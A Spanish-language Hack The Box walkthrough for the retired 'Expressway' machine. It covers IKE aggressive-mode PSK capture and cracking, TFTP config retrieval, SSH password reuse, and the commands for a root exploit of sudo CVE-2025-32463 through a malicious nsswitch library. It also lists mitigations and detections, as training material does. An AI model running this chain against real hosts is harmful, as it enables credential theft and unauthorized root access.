---
machine: Expressway
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, network, ike, ipsec, tftp, psk, sudo, cve-2025-32463, privesc]
---

# Expressway — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Solo hay SSH expuesto y dos servicios UDP: IKE en 500 y TFTP en 69. El modo agresivo revela la identidad `ike@expressway.htb` y permite capturar el hash del PSK, que se crackea con `hashcat -m 5400`; TFTP sirve `ciscortr.cfg`, que confirma el usuario. La misma contraseña funciona por SSH para `ike`. El `sudo` instalado es vulnerable a CVE-2025-32463: `--chroot` carga un `nsswitch.conf` controlado y una librería `libnss_*` maliciosa como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22 <IP>
nmap -Pn -sU -sV -p69,500 <IP>
```

- `22` OpenSSH, `500/udp` IKE y `69/udp` TFTP.
- No hay HTTP ni otros servicios TCP.
- El hostname es `expressway.htb`.

## Enumeración

`ike-scan -A` completa el handshake en modo agresivo y muestra `ID_USER_FQDN = ike@expressway.htb`. El mismo comando con `--pskcrack` guarda el material necesario para crackear el PSK.

```bash
ike-scan -A <IP>
ike-scan -A <IP> --pskcrack=handshake.txt
hashcat -m 5400 handshake.txt rockyou.txt
```

TFTP no siempre aparece como abierto en el escaneo inicial; se confirma con `tftp-enum`. Sirve `ciscortr.cfg`, cuya configuración muestra el usuario `ike` con la contraseña enmascarada. Se puede enumerar con el script NSE o descargar directamente:

```bash
nmap -Pn -sU -p69 --script tftp-enum <IP>
curl -s tftp://<IP>/ciscortr.cfg
```

## Foothold

El PSK crackeado se reutiliza como contraseña del usuario `ike`; la configuración de TFTP confirma que la cuenta existe. `netexec ssh` confirma el acceso y `sshpass` abre la sesión. La flag de usuario está en su home.

## Movimiento lateral

No aplica: `ike` es el único usuario no root con shell. Su clave SSH no añade acceso.

## Escalada de privilegios

La instancia vulnerable es `sudo` 1.9.17, dentro del rango de CVE-2025-32463 (1.9.14 a 1.9.17). Se crea `newroot/etc/nsswitch.conf` con `passwd: /0xdf`; glibc antepone `libnss_` y busca `libnss_/0xdf.so.2` en el directorio actual. Se compila una librería con un constructor que lanza una shell y se ejecuta `sudo --chroot newroot true`; `sudo` entra en el chroot antes de terminar de evaluar la política y carga la librería como root.

```bash
mkdir -p newroot/etc libnss_
echo "passwd: /0xdf" > newroot/etc/nsswitch.conf
gcc -shared -fPIC -o libnss_/0xdf.so.2 x.c
sudo --chroot newroot true
```

La variante CVE-2025-32462 abusa de una regla de sudoers asociada a otro host; el resultado es el mismo.

## Evidencia

- Handshake agresivo con identidad filtrada.
- Hash IKE-PSK SHA1 crackeado.
- Configuración `ciscortr.cfg` obtenida por TFTP.
- Acceso SSH como `ike`.
- `sudo --chroot` cargando la librería y shell de root.

## Lecciones aprendidas

- Un puerto UDP pequeño puede ser la única puerta de entrada.
- TFTP expuesto filtra configuraciones de red y nombres de usuario.
- El modo agresivo de IKE filtra identidad y material crackeable.
- Reutilizar el PSK como contraseña de sistema multiplica el impacto.
- `sudo --chroot` con `nsswitch.conf` escribible es ejecución como root.

## Mitigación y detección

- Usar IKEv2 con modo principal y PSK largo y aleatorio.
- No reutilizar secretos de red como contraseñas de usuarios.
- Filtrar UDP/69 y no publicar configuraciones de routers en TFTP.
- Actualizar `sudo` a 1.9.17p1 o superior y restringir `--chroot`.
- Alertar sobre `sudo --chroot` y sobre escrituras en `nsswitch.conf` fuera de `/etc`.

## Referencias

- [0xdf — Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [IppSec — Expressway](https://www.youtube.com/watch?v=XAsuxQCBVmY)
- [Hack The Box — Expressway](https://app.hackthebox.com/machines/expressway)
